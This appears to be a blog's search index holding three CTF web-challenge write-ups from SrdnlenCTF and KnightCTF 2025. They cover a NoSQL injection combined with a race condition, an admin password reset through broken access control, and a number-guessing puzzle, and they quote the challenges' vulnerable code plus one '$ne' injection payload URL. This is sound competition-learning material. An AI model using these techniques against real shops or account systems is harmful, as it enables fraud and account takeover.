[{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Focus. Speed. I Am Speed.' from SrdnlenCTF - 2025","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🌐 Focus. Speed. I Am Speed. Challenge Presentation ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:0:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event SrdlenCTF - 2025 Event Link 🔰 Category Web 🌐 💎 Points 50 Out of 500 total ⭐ Difficulty 🟢 Easy Personal Rating: 3/10 👤 Author Octaviusss Profile 🎮 Solves 189 XX% solve rate 📅 Date 19-01-2025 SrdlenCTF - 2025 Day X 🦾 Solved By aquila2 Team: Team Aetruria ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:1:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"📝 Challenge Information Welcome to Radiator Springs’ finest store, where every car enthusiast’s dream comes true! But remember, in the world of racing, precision matters—so tread carefully as you navigate this high-octane experience. Ka-chow! Website: http://speed.challs.srdnlen.it:8082 ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:2:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:3:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Provided Files Files:  Attached Files ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:3:1","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🔍 Initial Analysis ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:4:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"First Steps Initially, the website appears as follows: Site Presentation Home Page we notice by going to the Official Store that it is an online store. Official Store So, most likely, the intent of this challenge will be to purchase the flag. In fact, by opening the attached files, specifically app.js, we can notice these lines of code in the population of the database products: const products = [ { productId: 1, Name: \"Lightning McQueen Toy\", Description: \"Ka-chow! This toy goes as fast as Lightning himself.\", Cost: \"Free\" }, { productId: 2, Name: \"Mater's Tow Hook\", Description: \"Need a tow? Mater's here to save the day (with a little dirt on the side).\", Cost: \"1 Point\" }, { productId: 3, Name: \"Doc Hudson's Racing Tires\", Description: \"They're not just any tires, they're Doc Hudson's tires. Vintage!\", Cost: \"2 Points\" }, { productId: 4, Name: \"Lightning McQueen's Secret Text\", Description: \"Unlock Lightning's secret racing message! Only the fastest get to know the hidden code.\", Cost: \"50 Points\", FLAG: process.env.FLAG || 'SRDNLEN{fake_flag}' } ]; As we can see, in productId: 4 (the last and most expensive one, the flag is contained). Now we just need to figure out how to accumulate points. By continuing to analyze the attached files, we’ll realize that MongoDB is being used, and in app.py we will find a function that generates discount codes. const createDiscountCodes = async () =\u003e { const discountCodes = [ { discountCode: generateDiscountCode(), value: 20 } ]; for (const code of discountCodes) { const existingCode = await DiscountCodes.findOne({ discountCode: code.discountCode }); if (!existingCode) { await DiscountCodes.create(code); console.log(`Inserted discount code: ${code.discountCode}`); } else { console.log(`Discount code ${code.discountCode} already exists.`); } } }; This function generates 10 random discount codes for the purchase, which will be used to acquire points that can then be spent on purchasing items, via the /redeem route specified in the routes.py file. Here, there is a vulnerable part of the code, as it accepts a parameter discountCode, which can be used to redeem a valid code and acquire points. The vulnerability is found exactly in this portion of the code: const { discountCode } = req.query; if (!discountCode) { return res.render('error', { Authenticated: true, message: 'Discount code is required!' }); } const discount = await DiscountCodes.findOne({ discountCode }); In fact, since discountCode is a parameter that can be manipulated by the user and is directly used in the query as it is entered by the user, we can send a malicious payload using a NoSQL Injection to find a valid discount code. The query, as it is set, takes the discountCode and checks whether it matches one of those 10 randomly generated discount codes seen earlier. By sending a malicious payload, we can create a condition that returns True, allowing us to redeem a discount code even without knowing it. Later, there is a check where only one discount code can be redeemed per day. So, even if we try to redeem it, we would only get 20 of the 50 points needed. Continuing to read the code, to bypass this check, we can exploit another vulnerability. Usually, when a timeout or delay is applied, it is related to a Race Condition. As we can see in the following lines of code: // Apply the gift card value to the user's balance const { Balance } = await User.findById(req.user.userId).select('Balance'); user.Balance = Balance + discount.value; // Introduce a slight delay to ensure proper logging of the transaction // and prevent potential database write collisions in high-load scenarios. new Promise(resolve =\u003e setTimeout(resolve, delay * 1000)); user.lastVoucherRedemption = today; await user.save(); The account balance is extracted, then increased by adding the discount code that we have redeemed. A timeout is applied based on the delay variable declared at the beginning of the file (let delay = 1.5;), which is then multiplied by 1000 (to convert it to milliseconds). This results in a total timeout of 1.5 seconds before the balance update is actually performed in the database. We can exploit this time delay by sending, for example, two more requests in parallel to accumulate 60 points and purchase the flag. This is possible because the subsequent two requests will be sent in less than 1.5 seconds, and therefore, they will pass the checks done previously. These checks are based on the values present in the database, and since those values have not been updated yet due to the timeout, we can redeem multiple codes without being blocked by the restriction that allows redeeming only one code per day. By sending the requests during this window of time, we are able to bypass the restriction and accumulate enough points to purchase the flag. ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:4:1","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🎯 Solution Path ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:5:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Exploitation Steps Initial setup After understanding the vulnerabilities we are dealing with, I did a couple of searches on the internet to exploit the NoSQL Injection, as for the Race Condition, it’s enough to create an exploit script in Python with multithreading to send multiple requests simultaneously. Through PayloadAllTheThings, I searched for NoSQL payloads https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md. I tried the following payload: http://speed.challs.srdnlen.it:8082/redeem?discountCode[$ne]=test, where $ne stands for not equal. What could happen with this in the following portion of the code, which was also mentioned earlier? const existingCode = await DiscountCodes.findOne({ discountCode: code.discountCode }); As we mentioned, in this case, the above code will create a valid condition, so it’s as if we’ve found the correct discountCode. If we were to express this in natural language, the action would be find me a discountCode that is not equal to 'test'. As we saw during the generation phase, the discountCodes are totally random and alphanumeric, so it’s impossible for the database to have a discountCode equal to test. Therefore, the condition will return True, allowing us to redeem the code and add 20 points to our balance. Exploitation The exploitation phase doesn’t stop here. Now that we’ve figured out how to redeem points, we need to understand how to redeem more than 20 points per day, as mentioned earlier. We can use Python's multithreading to take advantage of that one and a half seconds timeout set for making multiple requests. So, I’ll write a script that does this and retrieves the flag, because doing it manually would be impossible. Flag capture Manual Flag ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:5:1","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🛠️ Exploitation Process ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:6:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Approach The Python exploit utilizes requests, bs4, and finally, multithreading to leverage the Race Condition. I create a pool of 20 threads that run simultaneously after a registration phase and account creation using the Faker library, which generates random fake credentials. Once that’s done, I take advantage of the NoSQL Injection for all the threads by visiting the /redeem?discountCode[$ne]=test route, which will redeem a code and add a total of 20 points to the account balance each time, taking advantage of the one-and-a-half-second timeout. Once all of that is done, I visit the root (/) of the site where the flag is displayed (as shown in the image above), and then I extract it using BeautifulSoup and print it out.  Exploit ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:6:1","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🚩 Flag Capture Flag ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:7:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:7:1","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🔧 Tools Used ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:8:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Primary Tools Tool Purpose Python Exploit ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:8:1","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"💡 Key Learnings ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:9:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"New Knowledge I have learned NoSQL Injection operators such as $ne, $lt, and how to exploit them in an unsanitized query. I also learned how to create a race condition with multiple sessions to exploit even the milliseconds of delay. ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:9:1","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Time Optimization Whenever a delay or any kind of lag is introduced in the code, always consider the possibility of a Race Condition. Additionally, where there are comments in the code, it’s as if there are hints pointing to where the vulnerability might be located. ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:9:2","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:9:3","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"📚 References \u0026 Resources ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:10:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Learning Resources https://www.invicti.com/learn/nosql-injection/ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md https://www.guidepointsecurity.com/blog/race-conditions-in-modern-web-applications/#:~:text=RACE%20conditions%20occur%20when%20we,RACE%20condition%20may%20be%20present. ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:10:1","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"📊 Final Statistics Metric Value Notes Time to Solve 00:15 From start to flag Global Ranking 26/1577 Challenge ranking Points Earned 500 Team contribution Created: 19-01-2025 • Last Modified: 19-01-2025 Author: mH4ck3r0n3 • Team: Team Aetruria ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:11:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Ben 10' from SrdnlenCTF - 2025","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🌐 Ben 10 Challenge Presentation ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:0:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event SrdlenCTF - 2025 Event Link 🔰 Category Web 🌐 💎 Points 50 Out of 500 total ⭐ Difficulty 🟢 Easy Personal Rating: 3/10 👤 Author gheddus Profile 🎮 Solves 354 XX% solve rate 📅 Date 19-01-2025 SrdlenCTF - 2025 Day X 🦾 Solved By mH4ck3r0n3 Team: Team Aetruria ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:1:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"📝 Challenge Information Ben Tennyson’s Omnitrix holds a mysterious and powerful form called Materia Grigia — a creature that only those with the sharpest minds can access. It’s hidden deep within the system, waiting for someone clever enough to unlock it. Only the smartest can access what’s truly hidden. Can you outsmart the system and reveal the flag? Website: http://ben10.challs.srdnlen.it:8080 ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:2:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:3:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Provided Files Files:  Attached Files ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:3:1","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🔍 Initial Analysis ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:4:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"First Steps Initially, the website appears as follows: Site Presentation Creating an account and logging into the site, it appears as follows: Home Page Trying to access the last image of the site, I receive the following error message: Ben 10 Consequently, I believe privileged access to the page is required. By examining the attached files, I noticed that every time a user was registered, another account was created in the database with admin privileges. The username of this account was formatted as “admin^username^token”. This can be observed in the following function in the app.py file: @app.route('/register', methods=['GET', 'POST']) def register(): \"\"\"Handle user registration.\"\"\" if request.method == 'POST': username = request.form['username'] password = request.form['password'] if username.startswith('admin') or '^' in username: flash(\"I don't like admins\", \"error\") return render_template('register.html') if not username or not password: flash(\"Both fields are required.\", \"error\") return render_template('register.html') admin_username = f\"admin^{username}^{secrets.token_hex(5)}\" admin_password = secrets.token_hex(8) try: conn = sqlite3.connect(DATABASE) cursor = conn.cursor() cursor.execute(\"INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)\", (username, password, admin_username)) cursor.execute(\"INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)\", (admin_username, admin_password, None)) conn.commit() except sqlite3.IntegrityError: flash(\"Username already exists!\", \"error\") return render_template('register.html') finally: conn.close() flash(\"Registration successful!\", \"success\") return redirect(url_for('login')) return render_template('register.html') Now, all we need is to find the user and exploit the password reset function for the admin user to gain access and extract the flag. I noticed that the admin username is exposed on the homepage after logging in, inside an HTML tag with CSS display:none, making it visible through the page source using ChromeDevTools: \u003cdiv style=\"display:none;\" id=\"admin_data\"\u003e{{ admin_username }}\u003c/div\u003e In fact, by viewing the page source, we can retrieve the admin username: Admin Username now we can proceed to the exploit. ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:4:1","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🎯 Solution Path ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:5:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Exploitation Steps Initial setup The initial phase involves registering a user account. Afterward, we need to log in and retrieve the username of the admin account that was created alongside the user account. This admin username is displayed on the homepage, as mentioned earlier. Once we have obtained the username, we can move on to the actual exploit. Exploitation The exploit involves resetting the password of the admin account to gain access. However, on the reset screen, we can only reset the password of the user account because a check is implemented in the reset function to block any user whose username starts with admin. Therefore, we begin the reset process with the normal user account created earlier to generate a valid reset token: Reset Token Once the token is generated, we gain access to the reset page. Here, no checks are applied on the type of account we want to reset; we only need to know the account name we obtained in the initial phase. Therefore, we proceed to reset the password of the admin account associated with our user account: Admin Password Reset Once the reset is completed, we simply need to log in with the admin account whose password we just reset, and visit the route /ben/10, which is the last photo in the list, to obtain the flag. Flag capture Manual Flag ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:5:1","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🛠️ Exploitation Process ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:6:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Approach The exploit uses requests and BeautifulSoup for extracting the user, the token, and the flag. It literally performs the step-by-step actions described previously: first, it creates an account using the Faker library to generate fake credentials. Then, it logs in and extracts the admin username associated with the user created earlier. After that, it resets the password for the admin user. Finally, after logging in again and visiting the /ben/10 route, it extracts the flag using BeautifulSoup (bs4) and prints it.  Exploit ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:6:1","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🚩 Flag Capture Flag ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:7:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:7:1","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🔧 Tools Used ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:8:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Primary Tools Tool Purpose Python Exploit ChromeDevTools Web Testing ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:8:1","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"💡 Key Learnings Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:9:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"📊 Final Statistics Metric Value Notes Time to Solve 00:10 From start to flag Global Ranking 20/1566 Challenge ranking Points Earned 500 Team contribution Created: 19-01-2025 • Last Modified: 19-01-2025 Author: mH4ck3r0n3 • Team: Team Aetruria ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:10:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'KnightCal' from KnightCTF - 2025","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🌐 KnightCal Challenge Presentation ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:0:0","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event KnightCTF - 2025 Event Link 🔰 Category Web 🌐 💎 Points 150 Out of XXXX total ⭐ Difficulty 🟢 Easy Personal Rating: 1/10 👤 Author NomanProdhan Profile 🎮 Solves 269 XX% solve rate 📅 Date 20-01-2025 KnightCTF - 2025 Day X 🦾 Solved By mH4ck3r0n3 Team: QnQSec ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:1:0","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"📝 Challenge Information In the realm of ancient codes, only those who enumerate correctly can unveil the hidden flag. Craft your mathematical expressions wisely and uncover the secrets that lie within. Flag Format: KCTF{FLaG_HeRe} ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:2:0","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:3:0","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Provided Files Files: None ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:3:1","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🔍 Initial Analysis ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:4:0","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"First Steps Initially, the website appears as follows: Site Presentation by trying to enter something in the numeric input box and submitting, I get letters in the file name: Submit Try so, I assume it’s about finding the correct combination to print the contents of the file flag.txt. ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:4:1","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🎯 Solution Path ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:5:0","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploitation Steps Initial setup After understanding how it works, I moved on to the exploit, doing a bit of guessing on the letters to figure out which number corresponded to which letter. Exploitation After a couple of attempts, I came up with this: Second Attempt continuing to experiment, I found the correct combination, 7195, which allowed me to read the flag.txt file. Flag capture Manual Flag ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:5:1","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🛠️ Exploitation Process ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:6:0","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Approach The exploit is very simple: it’s a POST request to the page where I pass the parameter expression=7195, which is the correct combination. Then, I extract the flag from the response text using bs4:  Exploit ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:6:1","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🚩 Flag Capture Flag ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:7:0","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:7:1","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🔧 Tools Used ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:8:0","tags":["🌐 Web Security"],"title":"KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Primary Tools Tool Purpose 